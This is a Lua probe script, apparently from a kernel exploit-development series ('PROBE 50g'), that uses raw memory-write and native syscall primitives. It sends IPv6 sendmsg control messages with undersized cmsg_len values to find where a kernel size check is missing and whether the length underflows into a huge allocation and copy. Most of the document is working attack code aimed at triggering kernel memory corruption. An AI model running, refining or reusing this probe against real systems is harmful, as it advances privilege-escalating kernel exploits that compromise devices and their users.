-- CRASH_CLASS: HIGH
-- PROBE 50g: where the ancillary size check lives
--
-- 50f sent a PKTINFO cmsg with cmsg_len=15 - one byte below sizeof(cmsghdr) -
-- and the kernel accepted the message (sendmsg returned the byte count) while
-- cmsg_len=4 and 8 were refused. That shape matters because the option data
-- length is computed as cmsg_len - CMSG_LEN(0); if that subtraction is done in
-- size_t without a lower-bound check, a sub-header cmsg_len underflows to a
-- huge length before the allocation and copy.
--
-- This sweep walks cmsg_len 12..24 for every IPV6 option type and prints the
-- send result. The exact value where a type stops being refused is the check
-- boundary; a type that keeps accepting below 16 is the interesting one.

print("=== PROBE 50g: ancillary size boundary ===")

local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(f,...) local ok,rv=pcall(f,...) if not ok then return -999 end return to_num(rv) end
local function pid() return to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20)) end

local SYS_socket, SYS_sendmsg, SYS_connect = 97, 28, 98
local AF_INET6, SOCK_DGRAM, IPPROTO_UDP, IPPROTO_IPV6 = 28, 2, 17, 41

local fd = call(mk(SYS_socket), uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP))
print("[0] socket=" .. fd .. " pid=" .. tostring(pid()))
if fd < 0 then print("[!] no socket"); return end

local sa = memory.alloc(0x40); zero(sa, 0x40)
wb(sa, 28); wb(sa + 1, 28); wb(sa + 2, 0x09); wb(sa + 23, 1)
print("[1] connect=" .. call(mk(SYS_connect), uint64(fd), uint64(sa), uint64(28)))

local data = memory.alloc(0x40); zero(data, 0x40); wd(data, 0x41414141)
local iov = memory.alloc(0x20); zero(iov, 0x20)
wq(iov, data); wq(iov + 8, 4)
local ctrl = memory.alloc(0x1000); zero(ctrl, 0x1000)
local mh = memory.alloc(0x80); zero(mh, 0x80)
wq(mh + 16, iov); wq(mh + 24, 1); wq(mh + 32, ctrl)

local function send(len_ctrl)
    wq(mh + 40, len_ctrl)
    return call(mk(SYS_sendmsg), uint64(fd), uint64(mh), uint64(0))
end

local names = {[46]="PKTINFO", [47]="RTHDRDSTOPTS", [48]="NEXTHOP", [49]="HOPOPTS",
               [50]="DSTOPTS", [51]="RTHDR", [52]="TCLASS"}
local types = {46, 47, 48, 49, 50, 51, 52}

print("")
print("--- cmsg_len sweep, controllen padded so the cmsg fits exactly ---")
print("  type            " .. table.concat({"12","13","14","15","16","17","18","20","24"}, "  "))
for _, T in ipairs(types) do
    local row = {}
    for _, L in ipairs({12, 13, 14, 15, 16, 17, 18, 20, 24}) do
        zero(ctrl, 0x1000)
        wq(ctrl, L)
        wd(ctrl + 8, IPPROTO_IPV6)
        wd(ctrl + 12, T)
        local align = (L + 7) - ((L + 7) % 8)
        if align < 16 then align = 16 end
        local r = send(align)
        row[#row + 1] = string.format("%-3s", tostring(r))
        local a = pid()
        if a == 0 then
            print("  " .. string.format("%-15s", names[T]) .. " ... process died at len=" .. L)
            return
        end
    end
    print("  " .. string.format("%-15s", names[T]) .. table.concat(row, "  "))
end

print("")
print("--- underflow probes: sub-header cmsg_len with a longer controllen ---")
for _, T in ipairs(types) do
    for _, L in ipairs({0, 1, 8, 15}) do
        zero(ctrl, 0x1000)
        wq(ctrl, L)
        wd(ctrl + 8, IPPROTO_IPV6)
        wd(ctrl + 12, T)
        local r = send(0x1000)
        local a = pid()
        print(string.format("  %-15s len=%-3d ctrl=0x1000 ret=%-6s alive=%s",
            names[T], L, tostring(r), tostring(a)))
        if a == 0 then return end
    end
end

print("[Z] alive=" .. tostring(pid()))
pcall(function() mk(6)(uint64(fd)) end)
print("=== PROBE 50g COMPLETE ===")
